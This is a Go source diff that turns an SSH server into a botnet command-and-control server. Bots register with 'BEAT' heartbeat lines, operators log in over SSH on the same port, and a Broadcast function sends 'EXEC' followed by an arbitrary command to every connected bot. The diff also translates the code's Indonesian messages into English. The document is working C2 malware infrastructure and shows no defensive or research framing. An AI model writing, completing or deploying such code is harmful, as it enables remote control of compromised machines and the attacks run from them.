@@ -1,9 +1,13 @@
 package server
 
 import (
+	"bufio"
 	"encoding/binary"
 	"fmt"
 	"net"
+	"strings"
+	"sync"
+	"time"
 
 	"golang.org/x/crypto/ssh"
 
@@ -19,6 +23,10 @@ type Server struct {
 	users  *auth.Store
 	theme  prompt.Theme
 	sshCfg *ssh.ServerConfig
+
+	mu   sync.Mutex
+	bots  map[string]shell.Bot
+	conns map[string]net.Conn
 }
 
 func New(cfg *config.Config) (*Server, error) {
@@ -36,6 +44,8 @@ func New(cfg *config.Config) (*Server, error) {
 		cfg:   cfg,
 		users: users,
 		theme: prompt.DefaultTheme,
+		bots:  map[string]shell.Bot{},
+		conns: map[string]net.Conn{},
 	}
 
 	s.sshCfg = &ssh.ServerConfig{
@@ -43,7 +53,7 @@ func New(cfg *config.Config) (*Server, error) {
 			if s.users.Authenticate(c.User(), string(pass)) {
 				return &ssh.Permissions{}, nil
 			}
-			return nil, fmt.Errorf("kredensial salah untuk %q", c.User())
+			return nil, fmt.Errorf("bad credentials for %q", c.User())
 		},
 	}
 	s.sshCfg.AddHostKey(signer)
@@ -56,18 +66,117 @@ func (s *Server) ListenAndServe() error {
 	if err != nil {
 		return fmt.Errorf("listen %s: %w", s.cfg.Address(), err)
 	}
-	fmt.Printf("SSH server berjalan di %s (%d user termuat)\n", s.cfg.Address(), s.users.Count())
+	fmt.Printf("C2 server listening on %s (%d users loaded)\n", s.cfg.Address(), s.users.Count())
 
 	for {
 		conn, err := ln.Accept()
 		if err != nil {
 			continue
 		}
-		go s.handleConn(conn)
+		go s.handleTCP(conn)
 	}
 }
 
-func (s *Server) handleConn(nConn net.Conn) {
+func (s *Server) Bots() []shell.Bot {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	list := make([]shell.Bot, 0, len(s.bots))
+	for _, b := range s.bots {
+		list = append(list, b)
+	}
+	return list
+}
+
+func (s *Server) Broadcast(cmd string) int {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	n := 0
+	for key, c := range s.conns {
+		if _, err := fmt.Fprintf(c, "EXEC %s\n", cmd); err != nil {
+			delete(s.bots, key)
+			delete(s.conns, key)
+			c.Close()
+			continue
+		}
+		n++
+	}
+	return n
+}
+
+func (s *Server) handleTCP(conn net.Conn) {
+	r := bufio.NewReader(conn)
+	head, err := r.Peek(3)
+	if err != nil {
+		conn.Close()
+		return
+	}
+	if string(head) == "SSH" {
+		s.handleSSH(&bufferedConn{conn, r})
+		return
+	}
+	s.handleBot(conn, r)
+}
+
+type bufferedConn struct {
+	net.Conn
+	r *bufio.Reader
+}
+
+func (c *bufferedConn) Read(p []byte) (int, error) {
+	return c.r.Read(p)
+}
+
+func (s *Server) handleBot(conn net.Conn, r *bufio.Reader) {
+	defer conn.Close()
+
+	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+	line, err := r.ReadString('\n')
+	if err != nil {
+		return
+	}
+	conn.SetReadDeadline(time.Time{})
+
+	fields := strings.Fields(strings.TrimSpace(line))
+	if len(fields) < 2 || fields[0] != "BEAT" {
+		return
+	}
+
+	arch := fields[1]
+	name := "bot"
+	if len(fields) >= 3 {
+		name = fields[2]
+	}
+	key := conn.RemoteAddr().String()
+	bot := shell.Bot{Username: name, Remote: key, Arch: arch}
+
+	s.mu.Lock()
+	s.bots[key] = bot
+	s.conns[key] = conn
+	total := len(s.bots)
+	s.mu.Unlock()
+	fmt.Printf("[%s] bot up: %s (%s) — total bots: %d\n",
+		time.Now().Format("15:04:05"), name, arch, total)
+
+	defer func() {
+		s.mu.Lock()
+		delete(s.bots, key)
+		delete(s.conns, key)
+		total := len(s.bots)
+		s.mu.Unlock()
+		fmt.Printf("[%s] bot down: %s (%s) — total bots: %d\n",
+			time.Now().Format("15:04:05"), name, key, total)
+	}()
+
+	for {
+		if _, err := r.ReadString('\n'); err != nil {
+			return
+		}
+	}
+}
+
+func (s *Server) handleSSH(nConn net.Conn) {
 	sshConn, chans, reqs, err := ssh.NewServerConn(nConn, s.sshCfg)
 	if err != nil {
 		nConn.Close()
@@ -82,9 +191,15 @@ func (s *Server) handleConn(nConn net.Conn) {
 	if !ok {
 		user = auth.User{Username: username}
 	}
+
+	fmt.Printf("[%s] operator connect: %s (%s)\n",
+		time.Now().Format("15:04:05"), username, sshConn.RemoteAddr().String())
+	defer fmt.Printf("[%s] operator disconnect: %s\n",
+		time.Now().Format("15:04:05"), username)
+
 	for newCh := range chans {
 		if newCh.ChannelType() != "session" {
-			newCh.Reject(ssh.UnknownChannelType, "hanya session yang didukung")
+			newCh.Reject(ssh.UnknownChannelType, "only session channels are supported")
 			continue
 		}
 		channel, requests, err := newCh.Accept()
@@ -92,7 +207,7 @@ func (s *Server) handleConn(nConn net.Conn) {
 			continue
 		}
 
-		sess := shell.New(channel, s.theme, user, s.cfg.Hostname)
+		sess := shell.New(channel, s.theme, user, s.cfg.Hostname, s.Bots, s.Broadcast)
 
 		go func(in <-chan *ssh.Request) {
 			for req := range in {
